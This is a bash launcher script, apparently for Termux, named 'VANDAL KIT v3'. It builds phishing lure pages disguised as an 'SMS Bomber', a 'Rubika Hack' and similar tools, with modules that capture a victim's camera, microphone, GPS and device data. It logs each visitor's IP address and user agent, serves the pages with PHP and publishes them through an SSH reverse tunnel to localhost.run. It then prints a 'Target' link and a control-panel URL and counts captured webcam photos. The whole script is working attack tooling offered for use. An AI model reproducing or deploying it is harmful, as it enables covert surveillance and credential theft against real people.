#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PORT="${1:-3333}"
WORK="$HOME/.vandal"
mkdir -p "$WORK" && cd "$WORK" || exit 1
PHP_PID=""; TUN_PID=""; LINK=""

banner() {
clear
echo -e "\033[1;91m"
echo " ██╗   ██╗ █████╗ ███╗   ██╗██████╗  █████╗ ██╗"
echo " ██║   ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║"
echo " ██║   ██║███████║██╔██╗ ██║██║  ██║███████║██║"
echo " ╚██╗ ██╔╝██╔══██║██║╚██╗██║██║  ██║██╔══██║██║"
echo "  ╚████╔╝ ██║  ██║██║ ╚████║██████╔╝██║  ██║███████╗"
echo "   ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝"
echo -e "\033[0m\033[1;91m     VANDAL KIT v3\033[0m"
echo ""
}

deps() { command -v php >/dev/null 2>&1 || pkg install -y php >/dev/null 2>&1; command -v ssh >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1; }

menu() {
echo -e "\033[1;96m── Select Page ──\033[0m"
echo -e "  \033[1;92m[1]\033[0m 💥 SMS Bomber"
echo -e "  \033[1;92m[2]\033[0m 🔓 Rubika Hack"
echo -e "  \033[1;92m[3]\033[0m 📸 Gallery Hack"
echo -e "  \033[1;92m[4]\033[0m 🔐 Rubika Filter"
read -p $'\033[1;93m[?] Select [1-4]: \033[0m' TEM; TEM="${TEM:-1}"

echo -e "\033[1;96m── Select Module ──\033[0m"
echo -e "  \033[1;92m[1]\033[0m 📸 Camera"
echo -e "  \033[1;92m[2]\033[0m 📸+🎤 Camera + Mic"
echo -e "  \033[1;92m[3]\033[0m 📸+📍 Camera + GPS"
echo -e "  \033[1;92m[4]\033[0m 📸+📱 Camera + Device"
echo -e "  \033[1;92m[5]\033[0m 🎯 ALL"
read -p $'\033[1;93m[?] Select [1-5]: \033[0m' MOD; MOD="${MOD:-5}"
}

build() {
case "$TEM" in
2) cp "$SCRIPT_DIR/rubika-hack.html" index2.html ;;
3) cp "$SCRIPT_DIR/gallery-hack.html" index2.html ;;
4) cp "$SCRIPT_DIR/rubika-filter.html" index2.html ;;
*) cp "$SCRIPT_DIR/sms-bomber.html" index2.html ;;
esac

cat > index.php <<'PHPEOF'
<?php $ip=$_SERVER['HTTP_CLIENT_IP']??$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR'];file_put_contents('visits.txt',date('c').'|'.$ip.'|'.($_SERVER['HTTP_USER_AGENT']??'').PHP_EOL,FILE_APPEND);header('Location:index2.html');
PHPEOF

cp "$SCRIPT_DIR/save.php" .
cp "$SCRIPT_DIR/panel.php" . 2>/dev/null
cp "$SCRIPT_DIR/login.php" .

echo -e "\033[1;92m[+] Ready\033[0m"
}

start_php() { pkill -f "php -S 0.0.0.0:$PORT" 2>/dev/null; sleep 1; php -S 0.0.0.0:$PORT >/dev/null 2>&1 & PHP_PID=$!; sleep 2; }

start_tunnel() {
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -R 80:localhost:$PORT localhost.run >tunnel.log 2>&1 &
TUN_PID=$!; for i in $(seq 1 20); do LINK=$(grep -oE 'https://[a-z0-9]+\.lhr\.life' tunnel.log|head -n1); [ -n "$LINK" ] && return 0; sleep 1; done
LINK="http://localhost:$PORT"
}

monitor() {
echo -e "\n\033[1;93m[*] Waiting... Ctrl+C to stop\033[0m"
while true; do c=$(ls webcam_*.jpg 2>/dev/null|wc -l); echo -e "\033[1;96m[*] 📸 $c photos | ${LINK}/panel.php\033[0m"; sleep 3; done
}

stop() { [ -n "$PHP_PID" ] && kill $PHP_PID 2>/dev/null; [ -n "$TUN_PID" ] && kill $TUN_PID 2>/dev/null; pkill -f "php -S 0.0.0.0:$PORT" 2>/dev/null; rm -f tunnel.log; exit 0; }

banner; deps; menu; build; start_php; start_tunnel
echo -e "\n\033[1;92m══════════════════════════════════════════════════\033[0m"
echo -e "\033[1;92m  Target : \033[0m${LINK}"
echo -e "\033[1;92m  Panel  : \033[0m${LINK}/panel.php"
echo -e "\033[1;92m══════════════════════════════════════════════════\033[0m\n"
monitor